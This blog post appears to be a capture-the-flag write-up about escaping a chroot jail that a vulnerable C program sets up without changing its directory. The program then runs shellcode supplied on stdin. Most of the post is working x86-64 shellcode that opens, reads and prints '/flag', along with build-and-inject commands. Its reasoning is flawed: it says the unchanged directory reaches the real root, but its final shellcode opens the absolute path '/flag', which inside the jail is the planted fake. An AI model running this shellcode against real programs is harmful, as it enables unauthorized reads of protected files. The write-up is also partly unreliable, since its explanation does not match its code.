---
layout: post
title:  "Evading Chroot Confinement via Tailored Shellcode"
date:   2023-09-04 03:00:30 +0100
category: pwn
---

## Table of Contents

1. [Introduction](#introduction)
    1. [The Challenge of Sandbox Escaping](#the-challenge-of-sandbox-escaping)
    2. [Understanding Chroot](#understanding-chroot)
       1. [The Chroot Sandbox-The Crucial Showdown](#the-chroot-sandbox-the-crucial-showdown)
       2. [Chroot](#chroot)
       3. [Chroot's Swagger and Flaws](#chroots-swagger-and-flaws)
    3. [Spot the Slip-Up - A Peek Behind the Curtains](#spot-the-slip-up---a-peek-behind-the-curtains)
         1. [Access to the Real Deal](#access-to-the-real-deal)
2. [Brace Yourself-The Plot Thickens](#brace-yourself-the-plot-thickens)
    1. [The Power Play - Unleashing mmap](#the-power-play---unleashing-mmap)
    2. [The Twist - Reading and Direct Execution](#the-twist---reading-and-direct-execution)
3. [Crafting the Shellcode](#crafting-the-shellcode)
    1. [A Simple Path - The pwntools Shortcut](#a-simple-path---the-pwntools-shortcut)
    2. [But the Code Sorcerer Yearns for More - Enter Assembler Artistry](#but-the-code-sorcerer-yearns-for-more---enter-assembler-artistry)
    3. [Unleashing "Hello World" - The Prelude](#unleashing-hello-world---the-prelude)
    4. [Code Transmutation - The Alchemy of Shellcode](#code-transmutation---the-alchemy-of-shellcode)
4. [Delving Deeper into the Art of Assembly and System Calls - The Hacker's Arsenal](#delving-deeper-into-the-art-of-assembly-and-system-calls---the-hackers-arsenal)
    1. [The Art of System Calls](#the-art-of-system-calls)
    2. [Cracking the Code - A Rollercoaster of Trials and Triumphs](#cracking-the-code---a-rollercoaster-of-trials-and-triumphs)
        1. [The Inception - The Birth of a Flawed Creation](#the-inception---the-birth-of-a-flawed-creation)
        2. [The Revelation - Stack Tricks and Register Wizardry](#the-revelation---stack-tricks-and-register-wizardry)

## Introduction

### The Challenge of Sandbox Escaping

In the realm of binary exploitation and system security, we explore deceptively simple binary program that challenges
those daring enough to confront it. This C-program poses as a formidable obstacle, designed to test the limits of sandbox
escaping and shellcode injection.

```C
int main(int argc, char **argv, char **envp)
{
	assert(argc > 1);

	puts("Checking to make sure you're not trying to open the flag.\n");
	assert(strstr(argv[1], "flag") == NULL);

	int fd = open(argv[1], O_RDONLY|O_NOFOLLOW);
	if (fd < 0)
    	printf("Failed to open the file located at `%s`.\n", argv[1]);
	else
    	printf("Successfully opened the file located at `%s`.\n", argv[1]);

	char jail_path[] = "/tmp/jail-XXXXXX";
	assert(mkdtemp(jail_path) != NULL);

	printf("Creating a jail at `%s`.\n", jail_path);

	assert(chroot(jail_path) == 0);

	int fffd = open("/flag", O_WRONLY | O_CREAT);
	write(fffd, "FLAG{FAKE}", 10);
	close(fffd);

	void *shellcode = mmap((void *)0x1337000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
	assert(shellcode == (void *)0x1337000);
	printf("Mapped 0x1000 bytes for shellcode at %p!\n", shellcode);

	int shellcode_size = read(0, shellcode, 0x1000);

	((void(*)())shellcode)();
}
```

The program begins by checking whether it has been provided with a command-line argument. 
This argument is expected to be a file path. After verifying the presence of an argument,
the program goes a step further to ensure that the argument does not point to the file located at `/flag`.

### Understanding Chroot

Now, the juicy bit – let's dissect the chroot sandbox and its weaknesses in this code:

#### The Chroot Sandbox-The Crucial Showdown

The heart of the matter here revolves around the cunning manipulation of the chroot sandbox.
To the uninitiated, chroot might sound like some impenetrable fortress, but we know better.
Before we dive into the guts of this challenge, let's demystify chroot for the newbies:

#### Chroot

In the cryptic realm of man pages, chroot presents itself as a humble command: 
`"run command or interactive shell with special root directory."` In plain English, 
it's like creating a mirage – a fake reality. Picture this: you want to let a buddy play with your computer, 
but you sure as hell don't want them nosing around your top-secret root directory.
Enter chroot. You can construct a parallel universe, say /jail, and lock your buddy inside it using chroot.
So, when they start poking around /, all they see is the insides of /jail, not your real deal root directory.

#### Chroot's Swagger and Flaws

Don't be fooled by chroot's swagger; it has its Achilles' heel. One glaring chink in its armor is that 
it doesn't completely sever communication between processes.
Crafty hackers can exploit this to snoop around the network and uncover potential vulnerabilities.
Also, chroot is a stickler for tradition; it won't change your current directory by default.
You've got to explicitly tell it, "chdir('/some/jail/path')," after tossing someone into the chroot abyss.

### Spot the Slip-Up - A Peek Behind the Curtains

Now, let's get to the fun part – where our intrepid programmer trips up.
You see, the magic happens because our coder here forgot to do something vital.
It's a slip-up so subtle that it tips the scales in our favor:

#### Access to the Real Deal

Here's the kicker: the programmer missed changing the current directory. A seemingly insignificant blunder,
but it leaves us with an "unknown" current directory, a digital no man's land. This oversight is our golden ticket.
It essentially grants us access to the real root directory. We're in!

#### The Flag File Firewall

But wait, don't pop the champagne just yet. The program still packs a punch.
It's got its hawkish eyes on the /flag file. If it smells even a whiff of us trying to peek into that vault, 
it's game over. The program plays dirty, swiftly pulling the plug.
This volatile mix of chroot's quirks and the program's relentless flag file vigilance paints the picture 
of our daring escapade – breaking free from the chroot cage.

## Brace Yourself-The Plot Thickens

Now, dear comrades, brace yourselves, for this is where the plot thickens, and the true hacker's playground reveals itself.

### The Power Play - Unleashing mmap

In this electrifying act, our protagonist takes center stage with a call to the mighty `mmap`.
Let me break it down for you in true hacker spirit. Here's what the man page whispers in the dark about `mmap`:

> "mmap() creates a new mapping in the virtual address space of the calling process.
> The starting address for the new mapping is specified in addr. The length argument specifies the length of the mapping."
> (which must be greater than 0).

In simpler terms, `mmap` is like a wizard conjuring new realms within the process's virtual address space.
These aren't your everyday realms; these are **executable realms**. That's right, the man page spills the beans 
with the ***PROT_EXEC*** flag, which means these realms can be executed. Goosebumps yet?

### The Twist - Reading and Direct Execution

Hold on to your hats, folks. This is where it gets spicy. The program, with a glint of audacity in its eye,
reads user input and does the unthinkable – it executes it on the spot.

That's right; we're diving headfirst into a shellcode challenge. In the world of shellcode, 
we wield the power of assembly instructions to bend the program to our will, like a maestro directing an orchestra.

So, grab your assembly tools, because the stage is set for an epic showdown where we write the script, 
and the program dances to our tune.

## Crafting the Shellcode

The grand scheme is laid bare, my fellow hackers. Our mission?
Simple: infiltrate, exfiltrate, and dominate. The objective - open that file, slurp its secrets, 
and send them flying to the land of stdout.

### A Simple Path - The pwntools Shortcut

Yes, there's a simple path, a well-trodden route through the treacherous terrain of binary hacking.
Enter the trusty Python library, pwntools, armed with its Shelcraft functionality. With it, 
we could craft a shellcode with our eyes closed.

```Python
shellcraft.readfile("/flag", 1)
```

Like a magician pulling a rabbit from a hat, this incantation conjures a shellcode that reads the /flag file 
and spills its secrets onto stdout.

### But the Code Sorcerer Yearns for More - Enter Assembler Artistry

Ah, but we're not here to take the easy road, are we? We're here to push the boundaries,
to forge our skills in the crucible of assembly knowledge.
So, we'll pass on the shortcuts and dive headfirst into the abyss, crafting our very own shellcode.

The canvas is blank, the possibilities endless. With our assembly prowess as the paintbrush,
we'll create a masterpiece that not only opens the file, but caresses its contents and whispers them to stdout.
It's not just hacking; it's artistry. So, let's get to work and sculpt this masterpiece of code.

### Unleashing "Hello World" - The Prelude

Ladies and gentlemen of the digital underworld, it's time to take a detour through the realm of 
the classic "Hello World." But why, you ask?
Because every great hacker's journey starts with "Hello World," a humble beginning for what lies ahead.

In the cryptic scrolls of assembly, behold our incantation:

```Assembly
section .text
global _start

_start:
   	 ; Write to stdout
   	 mov rdx, 13            ; Length of the message
  	 mov rsi, hello         ; Address of the message
   	 mov rdi, 1             ; File descriptor for stdout (1)
   	 mov rax, 1             ; syscall number for sys_write
   	 syscall

   	 ; The grand finale - exit the program gracefully
   	 mov rax, 60    	; System call number (sys_exit)
   	 xor rdi, rdi       ; Status code (0 for success)
   	 syscall 

section .data
hello: 	db 'Hello world!',10
```

By the hacker's code, we've summoned "Hello World" to grace our screens. 
But we're not stopping at mere greetings; this is just the warm-up.

To bring our creation to life, we must first wield the nasm compiler, commanding it with:

```bash
nasm -f elf64 hello.asm
```

Then, we summon the linker, ld, to breathe life into our code:

```bash
ld hello.o -o hello
```

And finally, with a triumphant flourish, we execute:

```bash
./hello
```

A message appears: "Hello world!" printed to the screen. A simple "Hello" to the world, but this is only the beginning.

Now, let's return to the hacker's path. We're after more than just "Hello World." 
We seek to wield this binary like a weapon. To do that, we must extract the machine code, 
our secret weapon, and inject it where it will cause the most chaos.

We summon the objcopy utility, instructing it to extract the precious binary with:

```bash
objcopy --dump-section .text=shellcode-raw hello
```

With the binary in hand, we're tempted to wield it recklessly by piping its contents like so:

```bash
cat shellcode-raw | ./prog arg
```

But beware! Such recklessness results in undefined chaos - segmentation faults, bus errors, etc. 
You see, we've entered the realm of shellcode, and here, rules are different.

### Code Transmutation - The Alchemy of Shellcode

For our shellcode to reign supreme, we must master the art of transmutation.
No more sections, no more rules. Our code must be a seamless entity.

So, behold our transformation:

```Assembly
section .text
global _start

_start:
; Write to stdout
mov rdx, 13
lea rsi, [rel + hello]
mov rdi, 1
mov rax, 1
syscall

; An elegant exit to avoid the abyss of segmentation faults
 mov rax, 60    	; System call number (sys_exit)
 xor rdi, rdi
 syscall        	; The kernel's call

hello: 	db 'Hello world!',10
```

Notice the subtle change? We've summoned "Hello World" yet again, but this time, 
we've harnessed the power of `lea` to load the effective address, sidestepping errors that plagued us before.

With this masterpiece, we execute the same ritual as before. 
And lo and behold, "Hello World" graces the screen once more.

Exciting, isn't it? With a few lines of assembly, we've made this program dance to our tune, 
a mere prelude to the symphony of code mastery that awaits us.

## Delving Deeper into the Art of Assembly and System Calls - The Hacker's Arsenal

Now, dear comrades, let us descend further into the abyss of code mastery. In the realm of assembly, 
we wield a double-edged sword: system calls. Gone are the luxuries of high-level languages with their printf and fopen.
Instead, we harness the raw power of kernel system calls.

In this arena, knowledge is our weapon, and the Linux syscall table is our sacred scripture 
(you can find a handy reference here: [Linux Syscall Table](https://filippo.io/linux-syscall-table/)).

### The Art of System Calls

Let's take a common C function like `write` as an example. 
In C, it's all neatly wrapped up for us with a bow: `ssize_t write(int fildes, const void *buf, size_t nbyte)`. 
The first argument is the file descriptor, the second is the buffer, and the third is the buffer size.

Now, in the gritty world of assembly, we rewrite the script. Behold the Linux syscall table,
a treasure map to our desired functionality:

```bash
%rax 	Name	%rdi		%rsi				%rdx
1	   write	int fd		const void *buf		size_t nbyte
```

The number for the `write` system call in this table is `1`. Our task is clear: we load the **rax** register with **1**,
designating the write call. Then, **rdi** becomes our `file descriptor`, **rsi** transforms into our `buffer`, 
and **rdx** holds the `length` of the buffer.

This is how we communicate with the kernel, my friends. These registers are our conduits,
and the syscall instruction our incantation. Armed with this knowledge, we craft code that bends the machine to our will.

### Cracking the Code - A Rollercoaster of Trials and Triumphs

Ah, fellow hackers, our journey takes us through twists and turns, a rollercoaster of code. 
Strap in as we dissect the enigma that is assembly.

#### The Inception - The Birth of a Flawed Creation

In the beginning, there was a flawed creation. Lines of code, devoid of comments, looked like a cryptic spellbook. 
This program sought to open a file, read its secrets, and reveal them to the world through the mighty stdout.

```Assembly
section .text
global _start

_start:
    ; Opening a file and binding it with an FD (File Descriptor)
    mov rdi, file       ; rdi receives the file name
    mov rsi, 0102o      ; rsi handles file opening flags
    mov rdx, 0644o      ; rdx defines file permissions
    mov rax, 2          ; rax stands for the syscall number for sys_open
    syscall

    ; Reading from the opened file
    mov [fd], rax       ; Storing the FD in memory for future reference
    mov rdi, [fd]       ; Restoring FD from memory
    mov rsi, buffer     ; rsi points to our buffer
    mov rdx, 1024       ; rdx defines the maximum bytes to read
    mov rax, 0          ; rax for sys_read
    syscall

    ; Writing to stdout    
    mov rdx, 1024       ; rdx defines the length to write
    mov rsi, buffer     ; rsi points to the buffer
    mov rdi, 0          ; rdi represents stdout (File Descriptor 0)
    mov rax, 1          ; rax for sys_write
    syscall

    ; Exit the program gracefully
    mov rax, 60         ; System call number for sys_exit
    syscall             ; Call upon the kernel

    file db '/flag', 0  ; The file name '/flag' null-terminated
    buffer times 1024 db 0  ; Our data buffer initialized with zeros
    fd dq 0             ; File Descriptor initialized to 0
```

This code did work when executed directly, but when trying to extract its essence for shellcode, 
it crumbled into a chaos of segmentation faults and mysteries.

#### The Revelation - Stack Tricks and Register Wizardry

In the dark of night, a revelation struck. We realized that we must employ dark arts: stack tricks and register wizardry.
Variables, once our trusted allies, became liabilities.

Behold, the final iteration:

```Assembly
section .text
global _start

_start:
    mov dword [rsp], '/fla'  ; Place the file pathname on the stack
    push 'g'                 ; Push 'g' onto the stack
    pop rcx                   ; Pop 'g' into rcx
    mov [rsp + 4], ecx       ; Store 'g' after '/fla'

    ; Opening a file and binding it with an FD
    lea rdi, [rsp]           ; Load effective address of the stack
    xor rsi, rsi             ; Clear rsi (opening flags not required) O_RDONLY
    mov rax, 2               ; rax for sys_open
    syscall

    mov rbx, rax             ; Store FD in rbx

    ; Reading from the opened file
    lea rsi, [rsp]           ; rsi points to our buffer
    mov rdi, rbx             ; rdi receives the FD
    mov rdx, 100             ; rdx defines the maximum bytes to read
    mov rax, 0               ; rax for sys_read
    syscall

    ; Writing to stdout    
    lea rsi, [rsp]           ; rsi points to the buffer
    mov rdi, 1               ; rdi represents stdout (File Descriptor 1)
    mov rdx, rax             ; rdx gets the number of bytes read
    mov rax, 1               ; rax for sys_write
    syscall

    ; Exit the shellcode
    mov rax, 60              ; System call number for sys_exit
    xor rdi, rdi             ; Clear rdi (exit status 0)
    syscall                  ; Call upon the kernel
```

Our stack now holds the file path, and registers orchestrate the symphony of code. This version is our masterpiece, our opus magnum.

And there it is, our creation is complete. We wield this shellcode with pride, for it opens the file,
reads its hidden knowledge, and shares it with the world. Our code dances through registers and memory, 
a true hacker's delight.

```bash
nasm -f elf64 readfile.asm
ld readfile.o -o readfile
objcopy --dump-section .text=shellcode-raw readfile
cat shellcode-raw | ./prog arg
```

The program obeys our commands, revealing the flag content and printing it to stdout. It's not magic; 
it's the art of assembly and the mastery of code.

> Lenart, (2023, september, 4) Evading Chroot Confinement via Tailored Shellcode